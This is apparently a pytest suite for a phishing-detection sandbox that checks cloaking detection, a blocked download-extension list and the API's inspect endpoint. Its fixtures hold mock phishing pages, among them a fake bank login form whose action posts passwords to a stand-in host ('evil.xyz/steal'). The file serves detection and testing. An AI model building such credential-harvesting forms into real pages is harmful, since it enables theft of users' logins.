"""
Tests for Playwright Headless Sandbox, cloaking detection, and egress filtering (sandbox.py).
"""
from __future__ import annotations

from unittest.mock import AsyncMock, patch
import pytest
import httpx

from app.sandbox import (
    BLOCKED_DOWNLOAD_EXTENSIONS,
    DESKTOP_PROFILE,
    INDIAN_MOBILE_PROFILE,
    detect_cloaking,
    inspect_url_in_sandbox,
    inspect_with_httpx,
)
from app.main import app


# ---------------------------------------------------------------------------
# Cloaking Detection Unit Tests
# ---------------------------------------------------------------------------

def test_cloaking_detected_on_redirect_destination_mismatch():
    desktop_res = {
        "final_url": "https://benign-parking.com/index.html",
        "title": "Welcome to Parking",
        "dom": "<html><body>Parking Domain</body></html>",
    }
    mobile_res = {
        "final_url": "https://evil-phish-portal.xyz/login",
        "title": "Secure Login",
        "dom": "<html><body><form><input type='password'></form></body></html>",
    }

    is_cloaking, reasons = detect_cloaking(desktop_res, mobile_res)
    assert is_cloaking is True
    assert any("redirect_cloaking" in r for r in reasons)


def test_cloaking_detected_on_title_status_mismatch():
    desktop_res = {
        "final_url": "https://fake-login.xyz/",
        "title": "404 Not Found - Error",
        "dom": "<html><body><h1>Error</h1></body></html>",
    }
    mobile_res = {
        "final_url": "https://fake-login.xyz/",
        "title": "State Bank of India - Online NetBanking",
        "dom": "<html><body><h1>SBI Login</h1></body></html>",
    }

    is_cloaking, reasons = detect_cloaking(desktop_res, mobile_res)
    assert is_cloaking is True
    assert any("title_cloaking" in r for r in reasons)


def test_cloaking_detected_on_mobile_credential_form():
    desktop_res = {
        "final_url": "https://fake-login.xyz/",
        "title": "Welcome",
        "dom": "<html><body><p>Under construction</p></body></html>",
    }
    mobile_res = {
        "final_url": "https://fake-login.xyz/",
        "title": "Welcome",
        "dom": "<html><body><form><input type='password' name='pw'></form></body></html>",
    }

    is_cloaking, reasons = detect_cloaking(desktop_res, mobile_res)
    assert is_cloaking is True
    assert "mobile_credential_form_cloaking" in reasons


def test_cloaking_detected_on_dom_length_divergence():
    desktop_res = {
        "final_url": "https://fake-login.xyz/",
        "title": "Welcome",
        "dom": "<html><body>" + "Short placeholder" + "</body></html>",
    }
    mobile_res = {
        "final_url": "https://fake-login.xyz/",
        "title": "Welcome",
        "dom": "<html><body>" + "<p>Heavy Phishing Portal</p>" * 80 + "</body></html>",
    }

    is_cloaking, reasons = detect_cloaking(desktop_res, mobile_res)
    assert is_cloaking is True
    assert any("dom_length_divergence" in r for r in reasons)


def test_no_cloaking_on_consistent_responses():
    desktop_res = {
        "final_url": "https://example.com/",
        "title": "Example Domain",
        "dom": "<html><head><title>Example Domain</title></head><body><h1>Example</h1></body></html>",
    }
    mobile_res = {
        "final_url": "https://example.com/",
        "title": "Example Domain",
        "dom": "<html><head><title>Example Domain</title></head><body><h1>Example</h1></body></html>",
    }

    is_cloaking, reasons = detect_cloaking(desktop_res, mobile_res)
    assert is_cloaking is False
    assert len(reasons) == 0


def test_blocked_download_extensions_coverage():
    # Verify critical attack vectors are blocked
    critical_exts = [".apk", ".exe", ".msi", ".dmg", ".zip", ".sh"]
    for ext in critical_exts:
        assert ext in BLOCKED_DOWNLOAD_EXTENSIONS


# ---------------------------------------------------------------------------
# Fallback Engine Unit Tests
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_inspect_with_httpx_mocked():
    mock_resp = AsyncMock()
    mock_resp.status_code = 200
    mock_resp.text = "<html><head><title>Mocked Site</title></head><body>Hello</body></html>"
    mock_resp.url = httpx.URL("https://example.org/")
    mock_resp.history = []

    with patch("httpx.AsyncClient.get", return_value=mock_resp):
        res = await inspect_with_httpx("https://example.org/", DESKTOP_PROFILE)

    assert res["status_code"] == 200
    assert res["title"] == "Mocked Site"
    assert "Hello" in res["dom"]
    assert "https://example.org/" in res["redirect_chain"]


# ---------------------------------------------------------------------------
# High-Level Sandbox Inspection Tests
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_inspect_url_in_sandbox_with_signals():
    fake_desktop = {
        "final_url": "https://fake-portal.xyz/login",
        "status_code": 200,
        "title": "Bank Login",
        "dom": "<html><body><form action='https://evil.xyz/steal'><input type='password'></form></body></html>",
        "redirect_chain": ["https://fake-portal.xyz/login"],
        "network_requests": ["https://fake-portal.xyz/login"],
        "screenshot_b64": "data:image/jpeg;base64,fakeimagebytes",
    }
    fake_mobile = dict(fake_desktop)

    with patch("app.sandbox._playwright_fetch", new_callable=AsyncMock, return_value=fake_desktop), \
         patch("app.visual_matcher.evaluate_visual_risk", return_value={"v_score": 0.85, "reasons": ["visual_brand_spoofing: Bank"]}):
        report = await inspect_url_in_sandbox(
            url="https://fake-portal.xyz/login",
            detect_cloaking_enabled=True,
            capture_screenshot=True,
            timeout_seconds=5.0,
        )

    assert report["url"] == "https://fake-portal.xyz/login"
    assert report["title"] == "Bank Login"
    assert report["cloaking_detected"] is False
    assert "signals" in report
    # Signal C should have detected the password input and offsite form action
    assert report["signals"]["C"] > 0.40
    # Signal V should reflect mocked visual score
    assert report["signals"]["V"] == 0.85


# ---------------------------------------------------------------------------
# API Integration Test
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_api_sandbox_inspect_endpoint():
    fake_report = {
        "url": "https://test-site.xyz/",
        "final_url": "https://test-site.xyz/",
        "status_code": 200,
        "title": "Test Portal",
        "redirect_chain": ["https://test-site.xyz/"],
        "network_requests": [],
        "cloaking_detected": False,
        "cloaking_reasons": [],
        "screenshot_b64": None,
        "signals": {"V": 0.0, "C": 0.0, "content_reasons": [], "visual_reasons": []},
        "sandbox_engine": "playwright",
    }

    transport = httpx.ASGITransport(app=app)
    with patch("app.main.inspect_url_in_sandbox", new_callable=AsyncMock, return_value=fake_report):
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/v1/sandbox/inspect", json={
                "url": "https://test-site.xyz/",
                "detect_cloaking": True,
                "capture_screenshot": False,
            })

    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "success"
    assert data["report"]["title"] == "Test Portal"
